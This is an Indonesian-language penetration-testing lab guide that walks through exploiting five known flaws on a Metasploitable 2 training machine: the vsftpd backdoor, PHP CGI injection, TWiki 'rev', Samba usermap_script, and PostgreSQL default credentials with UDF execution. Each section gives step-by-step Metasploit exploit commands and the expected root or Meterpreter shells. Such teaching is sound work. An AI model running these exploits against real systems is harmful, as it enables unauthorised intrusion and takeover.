Kerentanan 1 – Port 21

FTP – VSFTPD 2.3.4 Backdoor

Versi VSFTPD 2.3.4 mengandung backdoor yang sengaja ditanam – memungkinkan Remote Command Execution

📋 Profil Kerentanan

Service / ProtocolFTP (File Transfer Protocol)
Nama ProgramVSFTPD (Very Secure FTP Daemon)
Versi2.3.4
Jenis KerentananBackdoor Command Execution
Referensi Exploit-DBhttps://www.exploit-db.com/exploits/17491
Modul Metasploitexploit/unix/ftp/vsftpd_234_backdoor

Penjelasan Kerentanan

Versi VSFTPD 2.3.4 yang didistribusikan antara Juni–Juli 2011 mengandung backdoor yang ditanam oleh pihak tidak bertanggung jawab pada server distribusi resmi. Backdoor ini dipicu ketika username FTP mengandung karakter ":)". Ketika dipicu, server membuka port 6200 dan memberikan akses shell dengan hak akses root.

Identifikasi dengan Searchsploit

Terminal – Kali Linux
$ searchsploit vsftpd 2.3.4
---------------------------------------------------------------------- Exploit Title | Path ---------------------------------------------------------------------- vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/17491.rb ----------------------------------------------------------------------
Validasi 1 – Port 21 / FTP

Validasi VSFTPD 2.3.4 Backdoor via Metasploit

Ikuti langkah-langkah berikut secara berurutan di terminal Kali Linux

1
Jalankan Metasploit Framework
Terminal
$ sudo msfconsole
2
Cari modul exploit untuk VSFTPD
msf6 >
search vsftpd
3
Pilih dan aktifkan modul exploit
msf6 >
use exploit/unix/ftp/vsftpd_234_backdoor
4
Cek opsi yang diperlukan
msf6 exploit(vsftpd_234_backdoor) >
show options
5
Konfigurasi target (RHOSTS) dan jalankan exploit
msf6 exploit(vsftpd_234_backdoor) >
set rhosts 192.168.39.135
exploit
✅
Hasil yang diharapkan: Jika berhasil, Metasploit akan membuka sesi shell (command shell session) yang memberikan akses root pada mesin Metasploitable 2. Tangkap screenshot sebagai bukti validasi.

📝 Tugas Dokumentasi: Catat nama exploit yang digunakan, parameter yang dikonfigurasi, dan hasil akhir (berhasil/gagal beserta alasannya) dalam laporan praktik Anda.

Kerentanan 2 – Port 80

HTTP – PHP 5.2.4 CGI Argument Injection

PHP yang berjalan dalam mode CGI rentan terhadap injeksi argumen yang memungkinkan eksekusi kode jarak jauh

Enumerasi Web dengan Dirb

Terminal – Kali Linux
$ dirb 192.168.39.135

# Akan menemukan direktori dan file seperti: # /phpinfo.php # /twiki/ # /mutillidae/ # /dvwa/

Cek PHP Info

Akses URL berikut di browser:

http://192.168.39.135/phpinfo.php

Cari informasi:

  • PHP Version: 5.2.4
  • Server API: CGI/FastCGI

📋 Profil Kerentanan

Service / ProtocolHTTP
Nama ProgramPHP (berjalan sebagai CGI)
Versi5.2.4
Jenis KerentananCGI Bin Remote Code Execution (Argument Injection)
Referensihttps://www.exploit-db.com/exploits/29290
Modul Metasploitexploit/multi/http/php_cgi_arg_injection
💡
Mengapa Berbahaya? PHP dalam mode CGI memproses setiap request sebagai proses terpisah. Kerentanan ini memungkinkan penyerang menyisipkan argumen PHP melalui URL query string, yang kemudian dieksekusi oleh interpreter PHP sebagai perintah sistem.
Validasi 2 – Port 80 / PHP CGI

Validasi PHP 5.2.4 CGI Arg Injection via Metasploit

Ikuti langkah-langkah berikut secara berurutan di terminal Kali Linux

1
Jalankan Metasploit (jika belum berjalan)
Terminal
$ sudo msfconsole
2
Cari dan pilih modul exploit PHP CGI
msf6 >
search php_cgi
use exploit/multi/http/php_cgi_arg_injection
3
Cek opsi – perhatikan parameter RHOSTS, RPORT, dan TARGETURI
msf6 exploit(php_cgi_arg_injection) >
show options
4
Konfigurasi dan jalankan exploit
msf6 exploit(php_cgi_arg_injection) >
set rhosts 192.168.39.135
set rport 80
exploit
✅
Hasil yang diharapkan: Metasploit akan membuka sesi Meterpreter pada mesin target. Anda dapat menjalankan perintah seperti sysinfo, getuid, atau shell untuk berinteraksi dengan sistem target.
Kerentanan 3 – Port 80 / TWiki

HTTP – TWiki 'rev' Parameter Command Execution

Aplikasi TWiki yang terinstal pada Metasploitable 2 rentan terhadap eksekusi perintah melalui parameter 'rev'

Apa itu TWiki?

TWiki adalah platform wiki open-source untuk kolaborasi tim dan manajemen pengetahuan (knowledge management). TWiki sering digunakan sebagai basis pengetahuan atau dokumentasi internal dalam organisasi.

Cek versi TWiki melalui URL:

http://192.168.39.135/twiki/
http://192.168.39.135/twiki/bin/view/TWiki/TWikiHistory

📋 Profil Kerentanan

ServiceHTTP
ProgramTWiki
Versi~2003 (TWikiRelease20030201)
KerentananTWikiHistory 'rev' Command Execution
Exploit-DBID: 16892
Modul MSFexploit/unix/webapp/twiki_history

Cek Kerentanan dengan Searchsploit

Terminal – Kali Linux
$ searchsploit twiki

---------------------------------------------------------------------- TWiki <= 20040902 - 'rev' Shell Command Execution | 16892.rb ----------------------------------------------------------------------
💡
Mekanisme: TWiki versi lama memungkinkan eksekusi perintah OS melalui parameter rev dalam URL. Penyerang dapat menyisipkan perintah sistem yang kemudian dieksekusi oleh web server dengan hak akses web server.
Validasi 3 – Port 80 / TWiki

Validasi TWiki 'rev' Command Execution via Metasploit

Ikuti langkah-langkah berikut secara berurutan di terminal Kali Linux

1
Buka Metasploit dan cari modul TWiki
msf6 >
search twiki
2
Pilih modul exploit twiki_history
msf6 >
use exploit/unix/webapp/twiki_history
3
Cek opsi modul
msf6 exploit(twiki_history) >
show options  # Perhatikan RHOSTS dan TARGETURI
4
Konfigurasi dan jalankan exploit
msf6 exploit(twiki_history) >
set rhosts 192.168.39.135
exploit
✅
Hasil yang diharapkan: Metasploit membuka sesi command shell pada mesin target. Jalankan perintah id atau whoami untuk memverifikasi level akses yang diperoleh.

🔑 Poin Pembelajaran: Aplikasi web yang sudah usang dan tidak diperbarui adalah salah satu vektor serangan paling umum. TWiki versi 2003 seharusnya sudah dinonaktifkan atau diperbarui ke versi terbaru.

Kerentanan 4 – Port 139/445

SMB – Samba 3.0.20 'Username' Map Script

Samba adalah implementasi open-source dari protokol SMB untuk sistem Unix/Linux

Enumerasi SMB dengan smbclient

Cek apakah anonymous login diizinkan:

Terminal – Kali Linux
$ smbclient -L //192.168.39.135/tmp

# Tekan Enter saat diminta password # Jika berhasil: terlihat daftar shares # Informasi versi: Samba 3.0.20-Debian

📋 Profil Kerentanan

ServiceSMB (Server Message Block)
ProgramSamba
Versi3.0.20-Debian
Kerentanan'Username' map script Command Execution
Exploit-DBID: 16320
Modul MSFexploit/multi/samba/usermap_script
💡
Mengapa Port 139 dan 445? Samba menggunakan kedua port ini. Port 139 adalah NetBIOS over TCP/IP (warisan lama), sementara port 445 adalah SMB langsung over TCP. Keduanya aktif secara bersamaan pada Metasploitable 2.
⚙️
Mekanisme Serangan: Kerentanan ini ada pada fitur "username map script" di konfigurasi Samba. Ketika username yang dikirim mengandung metacharacter shell, perintah tersebut dieksekusi oleh Samba dengan hak akses root.
Validasi 4 – Port 139/445 / SMB

Validasi Samba 3.0.20 Usermap Script via Metasploit

Ikuti langkah-langkah berikut secara berurutan di terminal Kali Linux

1
Buka Metasploit dan cari modul Samba
msf6 >
search samba usermap
2
Pilih modul exploit usermap_script
msf6 >
use exploit/multi/samba/usermap_script
3
Cek opsi yang diperlukan
msf6 exploit(usermap_script) >
show options
4
Konfigurasi target dan jalankan exploit
msf6 exploit(usermap_script) >
set rhosts 192.168.39.135
exploit
✅
Hasil yang diharapkan: Berhasil mendapatkan sesi command shell dengan hak akses root. Verifikasi dengan menjalankan perintah id yang seharusnya menampilkan uid=0(root).

📝 Catatan Penting: Samba 3.0.20 dirilis pada tahun 2004. Penggunaan versi software yang sudah sangat usang adalah salah satu penyebab utama pelanggaran keamanan pada dunia nyata (contoh: EternalBlue / WannaCry pada SMB Windows).

Kerentanan 5 – Port 5432

PostgreSQL 8.3.1 – Weak Credential + UDF Execution

Database PostgreSQL menggunakan kredensial default yang mudah ditebak, lalu dieksploitasi untuk eksekusi kode

Tahap 1: Brute Force Login PostgreSQL

msf6 > (menggunakan modul Auxiliary Scanner)
use auxiliary/scanner/postgres/postgres_login
show options
set rhosts 192.168.39.135
run

# Hasil yang diharapkan: # [+] 192.168.39.135:5432 - Login Successful: postgres:postgres

📋 Profil Kerentanan

ServiceDatabase (PostgreSQL)
ProgramPostgreSQL
Versi8.3.1
Kerentanan 1Default/Weak Credential: postgres:postgres
Kerentanan 2UDF (User-Defined Function) for Command Execution
Exploit-DBID: 7855
Modul MSFexploit/linux/postgres/postgres_payload
💡
Pola Serangan 2 Tahap: Pertama, penyerang mendapatkan akses ke database menggunakan kredensial default. Kemudian memanfaatkan fitur UDF PostgreSQL untuk mengeksekusi perintah OS dari dalam database dengan hak akses postgres.
Validasi 5 – Port 5432 / PostgreSQL

Validasi PostgreSQL UDF Payload via Metasploit

Setelah mendapatkan kredensial, lanjutkan dengan eksploitasi UDF untuk Remote Code Execution

1
Pilih modul exploit PostgreSQL payload
msf6 >
use exploit/linux/postgres/postgres_payload
2
Cek deskripsi modul untuk memahami cara kerja exploit
msf6 exploit(postgres_payload) >
info
3
Cek opsi – perhatikan USERNAME, PASSWORD, dan RHOSTS
msf6 exploit(postgres_payload) >
show options
4
Konfigurasi menggunakan kredensial yang ditemukan dan jalankan exploit
msf6 exploit(postgres_payload) >
set rhosts 192.168.39.135
set username postgres
set password postgres
exploit
✅
Hasil yang diharapkan: Metasploit membuka sesi Meterpreter atau command shell dengan hak akses postgres. Tangkap output perintah sysinfo dan getuid sebagai bukti keberhasilan.

Rekomendasi Mitigasi

🛡️
FTP, PHP, TWiki, Samba: Update/upgrade ke versi terbaru. Nonaktifkan layanan yang tidak diperlukan. Terapkan prinsip least privilege.
